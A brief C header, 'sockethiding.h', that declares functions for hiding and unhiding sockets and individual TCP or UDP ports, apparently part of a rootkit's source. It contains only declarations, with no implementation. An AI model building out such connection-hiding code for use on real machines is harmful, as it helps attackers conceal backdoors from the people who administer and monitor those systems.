#ifndef SOCKETHIDING_H
#define SOCKETHIDING_H

extern void hide_sockets(void);
extern void unhide_sockets(void);
extern void hide_port_tcp(int);
extern void hide_port_udp(int);

enum sock_t {TCP=0, UDP=1};

#endif
